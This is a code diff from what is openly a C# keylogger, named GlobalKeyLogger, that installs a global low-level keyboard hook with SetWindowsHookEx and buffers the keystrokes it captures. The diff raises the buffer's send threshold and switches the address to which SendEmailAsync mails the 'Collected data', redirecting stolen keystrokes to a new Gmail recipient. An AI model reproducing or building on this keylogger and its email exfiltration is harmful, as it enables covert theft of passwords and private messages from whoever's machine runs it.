@@ -15,7 +15,7 @@ namespace GlobalKeyLogger
         private static StringBuilder tempBuffer = new StringBuilder();
         private static readonly object bufLock = new object();
         private static IntPtr _hookID = IntPtr.Zero;
-        private const int CharacterLimit = 2; // Character limit
+        private const int CharacterLimit = 20; // Character limit
 
         [DllImport("user32.dll")]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hMod, uint threadId);
@@ -108,7 +108,7 @@ namespace GlobalKeyLogger
 
             try
             {
-                await SendEmailAsync("utaha765@gmail.com", "Collected data", content);
+                await SendEmailAsync("timeywimeyefe@gmail.com", "Collected data", content);
                 lock (bufLock) tempBuffer.Clear();
             }
             catch (Exception ex)
